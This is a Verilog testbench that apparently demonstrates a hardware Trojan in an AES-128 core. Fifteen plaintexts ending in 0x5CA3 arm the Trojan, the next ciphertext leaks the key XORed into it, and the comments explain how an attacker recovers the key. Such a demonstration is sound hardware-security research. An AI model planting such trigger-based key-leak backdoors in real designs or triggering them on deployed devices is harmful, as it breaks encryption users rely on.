//======================================================================
// tb_trojan1_key_leak.v
// ---------------------
// Testbench demonstrating Trojan 1: Key Leakage via Ciphertext
//
// This testbench shows:
// 1. Normal AES-128 encryption producing correct ciphertext
// 2. Trojan activation after 15 trigger-pattern encryptions,
//    causing the 16th encryption to XOR the key into the output
//======================================================================

`default_nettype none
`timescale 1ns/1ps

module tb_trojan1_key_leak();

  //----------------------------------------------------------------
  // Parameters and constants
  //----------------------------------------------------------------
  parameter CLK_HALF_PERIOD = 5;
  parameter CLK_PERIOD      = 2 * CLK_HALF_PERIOD;

  parameter ADDR_CTRL    = 8'h08;
  parameter ADDR_STATUS  = 8'h09;
  parameter ADDR_CONFIG  = 8'h0a;
  parameter ADDR_KEY0    = 8'h10;
  parameter ADDR_KEY1    = 8'h11;
  parameter ADDR_KEY2    = 8'h12;
  parameter ADDR_KEY3    = 8'h13;
  parameter ADDR_KEY4    = 8'h14;
  parameter ADDR_KEY5    = 8'h15;
  parameter ADDR_KEY6    = 8'h16;
  parameter ADDR_KEY7    = 8'h17;
  parameter ADDR_BLOCK0  = 8'h20;
  parameter ADDR_BLOCK1  = 8'h21;
  parameter ADDR_BLOCK2  = 8'h22;
  parameter ADDR_BLOCK3  = 8'h23;
  parameter ADDR_RESULT0 = 8'h30;
  parameter ADDR_RESULT1 = 8'h31;
  parameter ADDR_RESULT2 = 8'h32;
  parameter ADDR_RESULT3 = 8'h33;

  //----------------------------------------------------------------
  // DUT signals
  //----------------------------------------------------------------
  reg           clk;
  reg           reset_n;
  reg           cs;
  reg           we;
  reg  [7 : 0]  address;
  reg  [31 : 0] write_data;
  wire [31 : 0] read_data;

  reg [31 : 0] result0, result1, result2, result3;
  reg [31 : 0] error_ctr;

  //----------------------------------------------------------------
  // DUT instantiation
  //----------------------------------------------------------------
  aes dut(
    .clk(clk),
    .reset_n(reset_n),
    .cs(cs),
    .we(we),
    .address(address),
    .write_data(write_data),
    .read_data(read_data)
  );

  //----------------------------------------------------------------
  // Clock generation
  //----------------------------------------------------------------
  always #CLK_HALF_PERIOD clk = ~clk;

  //----------------------------------------------------------------
  // Helper tasks
  //----------------------------------------------------------------
  task write_word(input [7:0] addr, input [31:0] data);
    begin
      @(posedge clk);
      address    = addr;
      write_data = data;
      cs         = 1'b1;
      we         = 1'b1;
      @(posedge clk);
      cs         = 1'b0;
      we         = 1'b0;
    end
  endtask

  task read_word(input [7:0] addr);
    begin
      @(posedge clk);
      address = addr;
      cs      = 1'b1;
      we      = 1'b0;
      @(posedge clk);
      cs      = 1'b0;
    end
  endtask

  task wait_ready;
    begin
      read_word(ADDR_STATUS);
      while (read_data[0] == 1'b0) begin
        read_word(ADDR_STATUS);
      end
    end
  endtask

  task load_key_128(input [127:0] key_val);
    begin
      // AES-128: key occupies key[255:128], so KEY0..KEY3
      write_word(ADDR_KEY0, key_val[127:96]);
      write_word(ADDR_KEY1, key_val[95:64]);
      write_word(ADDR_KEY2, key_val[63:32]);
      write_word(ADDR_KEY3, key_val[31:0]);
      write_word(ADDR_KEY4, 32'h0);
      write_word(ADDR_KEY5, 32'h0);
      write_word(ADDR_KEY6, 32'h0);
      write_word(ADDR_KEY7, 32'h0);
      // Config: encdec=1 (encrypt), keylen=0 (128-bit) => 8'h01
      write_word(ADDR_CONFIG, 32'h00000001);
      // Init key expansion: init_bit=0 => CTRL=8'h01
      write_word(ADDR_CTRL, 32'h00000001);
      #(100 * CLK_PERIOD);
    end
  endtask

  task encrypt_block(input [127:0] plaintext);
    begin
      write_word(ADDR_BLOCK0, plaintext[127:96]);
      write_word(ADDR_BLOCK1, plaintext[95:64]);
      write_word(ADDR_BLOCK2, plaintext[63:32]);
      write_word(ADDR_BLOCK3, plaintext[31:0]);
      write_word(ADDR_CTRL, 32'h00000002);
      #(100 * CLK_PERIOD);
      read_word(ADDR_RESULT0); result0 = read_data;
      read_word(ADDR_RESULT1); result1 = read_data;
      read_word(ADDR_RESULT2); result2 = read_data;
      read_word(ADDR_RESULT3); result3 = read_data;
    end
  endtask

  //----------------------------------------------------------------
  // Test sequences
  //----------------------------------------------------------------
  initial begin
    $display("=== Trojan 1: Key Leakage via Ciphertext ===");
    $display("");

    clk        = 1'b0;
    reset_n    = 1'b0;
    cs         = 1'b0;
    we         = 1'b0;
    address    = 8'h0;
    write_data = 32'h0;
    error_ctr  = 0;

    #(CLK_PERIOD * 5);
    reset_n = 1'b1;
    #(CLK_PERIOD * 5);

    // ============================================================
    // TEST 1: Normal operation — NIST AES-128 test vector
    // ============================================================
    $display("[TEST 1] Normal AES-128 encryption (NIST test vector)");
    load_key_128(128'h2b7e151628aed2a6abf7158809cf4f3c);

    // Standard NIST plaintext
    encrypt_block(128'h6bc1bee22e409f96e93d7e117393172a);

    $display("  Ciphertext: %h %h %h %h", result0, result1, result2, result3);
    if ({result0, result1, result2, result3} == 128'h3ad77bb40d7a3660a89ecaf32466ef97)
      $display("  [PASS] Correct NIST ciphertext produced.");
    else begin
      $display("  [FAIL] Incorrect ciphertext!");
      error_ctr = error_ctr + 1;
    end
    $display("");

    // ============================================================
    // TEST 2: Trigger the Trojan — send 15 blocks with pattern
    // The trigger pattern: block[15:0] == 16'h5CA3
    // After 15 matching encryptions, seq_match_cnt saturates to 4'hF
    // The 16th encryption leaks key[127:0] XORed into result
    // ============================================================
    $display("[TEST 2] Activating Trojan — sending 15 trigger-pattern blocks");

    // Reload key to reset
    load_key_128(128'h2b7e151628aed2a6abf7158809cf4f3c);

    begin : trigger_loop
      integer i;
      for (i = 0; i < 15; i = i + 1) begin
        // Plaintext with trigger pattern in lowest 16 bits: xxxx_xxxx_xxxx_5CA3
        encrypt_block({96'h00112233_44556677_8899AABB, 16'hCC00 + i[15:0], 16'h5CA3});
        $display("  Trigger block %0d encrypted.", i + 1);
      end
    end

    $display("");
    $display("[TEST 2b] Trojan should now be active. Encrypting leak block...");

    // This 16th block also has the trigger pattern, counter is now 0xF
    // The result will be: actual_ciphertext XOR key[127:0]
    encrypt_block(128'h00000000_00000000_00000000_00005CA3);

    $display("  Leaked result:   %h %h %h %h", result0, result1, result2, result3);
    $display("  Known key[127:0]: 2b7e1516 28aed2a6 abf71588 09cf4f3c");

    // To recover the key, an attacker XORs the leaked result with the
    // expected ciphertext (computed separately or via a golden model).
    $display("");
    $display("  An attacker who knows the plaintext and expected ciphertext");
    $display("  can recover the key by: key = leaked_result XOR expected_ciphertext");

    $display("");
    $display("=== Test Summary ===");
    $display("  Errors: %0d", error_ctr);
    if (error_ctr == 0)
      $display("  All normal operation tests PASSED.");
    $display("  Trojan demonstration complete — key leaked through ciphertext.");
    $display("");

    $finish;
  end

endmodule
